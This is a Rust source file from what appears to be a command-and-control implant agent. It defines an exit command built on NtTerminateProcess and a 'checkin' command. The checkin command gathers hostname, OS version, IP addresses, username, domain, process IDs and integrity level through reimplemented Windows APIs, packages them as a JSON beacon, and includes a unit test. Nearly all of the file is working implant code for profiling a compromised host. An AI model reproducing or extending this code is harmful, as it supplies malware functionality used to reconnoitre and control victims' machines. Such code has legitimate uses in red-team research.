use core::ffi::c_void;

use libc_print::libc_println;
use mod_agentcore::{instance, instance_mut};
use mod_win32::{
    nt_current_process,
    nt_get_adapters_info::get_adapters_info,
    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
    nt_peb::{
        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
        get_username,
    },
    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
};
use rs2_communication_protocol::communication_structs::checkin::{Checkin, PartialCheckin};

use crate::setup::system_data::checkin_from_raw;

/// Terminates the current process based on the provided exit type.
///
/// This function invokes the NT API `NtTerminateProcess` to terminate the current process
/// if `exit_type` is 1. The termination process is a blocking operation.
///
/// # Parameters
/// - `exit_type`: Specifies the type of exit. If set to 1, the process is terminated.
///
/// # NT API:
/// - Calls `NtTerminateProcess` from the Windows NT API.
///
/// # Safety
/// - This function interacts with low-level NT APIs and terminates the process, which may lead
///   to data loss or corruption if used improperly.
pub fn command_exit(exit_type: i32) {
    // Example of an asynchronous operation before termination
    if exit_type == 1 {
        // The actual process termination remains a synchronous operation
        unsafe {
            let ntstatus = instance().ntdll.nt_terminate_process.run(-1isize as _, 0);

            // Check if the termination was successful
            if ntstatus < 0 {
                // Print an error message if the termination failed
                libc_println!("NtTerminateProcess failed: {:#X}", ntstatus);
            }
        }
    }
}

/// Gathers system and process metadata, creates a `Checkin` object, and serializes it to JSON format.
///
/// This function retrieves various system information and process details, performing actions equivalent to several Windows APIs.
///
/// # Functions involved
/// - `get_computer_name_ex`: Retrieves the DNS hostname of the computer. Replicates the functionality of the `GetComputerNameExW` Windows API.
/// - `get_os`: Retrieves the operating system information from the Process Environment Block (PEB).
/// - `get_os_version_info`: Fetches detailed OS version information. Replicates the functionality of `RtlGetVersion`.
/// - `get_adapters_info`: Retrieves information about the network adapters, including IP addresses. Replicates the functionality of `GetAdaptersInfo`.
/// - `get_pid_and_ppid`: Retrieves the current process ID (PID) and the parent process ID (PPID).
/// - `get_process_integrity`: Determines the integrity level of the current process. Replicates the functionality of `GetTokenInformation` with `TokenIntegrityLevel`.
/// - `get_user_domain`: Retrieves the user's domain name.
/// - `get_username`: Retrieves the username of the current user. Replicates the functionality of `GetUserNameW`.
/// - `get_process_name`: Retrieves the name of the current process.
/// - `get_image_path_name`: Retrieves the image path of the current process.
///
/// # Returns
/// - `Result<String, serde_json::Error>`: A JSON string of the `Checkin` object on success, or a `serde_json::Error` on serialization failure.
///
/// # Safety
/// This function uses several `unsafe` blocks to interact with system-level APIs and perform raw pointer dereferencing.
/// The caller must ensure that the system and memory are in a valid state before calling this function.
///
pub fn command_checkin() -> Result<String, serde_json::Error> {
    // Get the computer name in DNS Hostname format.
    let mut buffer = Vec::new();
    let mut size: u32 = 0;
    let success = unsafe {
        get_computer_name_ex(
            ComputerNameFormat::ComputerNameDnsHostname,
            &mut buffer,
            &mut size,
        )
    };

    // Initialize a string to hold the hostname.
    let mut hostname = String::new();
    if success {
        // Convert the computer name buffer (UTF-16) to a Rust `String`.
        hostname = String::from_utf16_lossy(&buffer)
            .trim_end_matches('\0') // Remove any trailing null characters.
            .to_string();
    } else {
        // Log an error if retrieving the computer name fails.
        libc_println!("[!] get_computer_name_ex failed");
    }

    // Retrieve the operating system information from the PEB (Process Environment Block).
    let os_info_peb = unsafe { get_os() };

    // Retrieve more detailed operating system version information.
    let get_os_version_info_result = unsafe { get_os_version_info() };
    let mut operating_system = String::new();
    if get_os_version_info_result.is_ok() {
        let os_version_info = get_os_version_info_result.unwrap();

        // Construct a string representing the operating system version.
        operating_system.push_str(&format!(
            "{} {}.{}.{} (Platform ID: {})",
            os_info_peb,
            os_version_info.dw_major_version,
            os_version_info.dw_minor_version,
            os_version_info.dw_build_number,
            os_version_info.dw_platform_id,
        ));
    }

    // Retrieve information about the network adapters (e.g., IP addresses).
    let ip_addresses = unsafe { get_adapters_info() };

    // Retrieve the current process ID (PID) and parent process ID (PPID).
    let (pid, ppid) = unsafe { get_pid_and_ppid() };

    // Retrieve the integrity level of the current process.
    let rid = unsafe { get_process_integrity(nt_current_process()) };

    let first_ip = ip_addresses.unwrap().get(0).unwrap().1.clone();
    // Create a `Checkin` object with the gathered metadata.
    let checkin = unsafe {
        Box::new(Checkin::new(PartialCheckin {
            operative_system: operating_system, // OS details.
            hostname: hostname,                 // Computer hostname.
            domain: get_user_domain(),          // User's domain name.
            username: get_username(),           // User's username.
            ip: first_ip,                       // Network adapter IP addresses.
            process_id: pid as i64,             // Process ID.
            parent_process_id: ppid as i64,     // Parent Process ID.
            process_name: get_process_name(),   // Name of the current process.
            integrity_level: rid,               // Process integrity level.
            cwd: get_image_path_name(),         // Current working directory.
        }))
    };

    // Set the `Checkin` data in the global instance for further access.
    unsafe { instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void) };

    // Serialize the `Checkin` object to a JSON string and return it.
    serde_json::to_string(unsafe { checkin_from_raw(instance().pcheckindata.as_mut().unwrap()) })
}

#[cfg(test)]
mod tests {

    use super::*;

    #[test]
    fn test_checkin() {
        // Test gathering system information and metadata for check-in
        let result = command_checkin();

        // Ensure the result is successful
        assert!(
            result.is_ok(),
            "Failed to execute check-in command: {:?}",
            result.err()
        );

        // Verify the JSON output contains expected fields
        let json_output = result.unwrap();
        assert!(json_output.contains("hostname"), "Missing 'hostname' field");
        assert!(
            json_output.contains("operative_system"),
            "Missing 'operative_system' field"
        );
        assert!(json_output.contains("ip"), "Missing 'ip' field");
        assert!(
            json_output.contains("process_id"),
            "Missing 'process_id' field"
        );
        assert!(
            json_output.contains("parent_process_id"),
            "Missing 'parent_process_id' field"
        );
        assert!(
            json_output.contains("integrity_level"),
            "Missing 'integrity_level' field"
        );

        // You can extend these checks with specific values or fields
    }
}
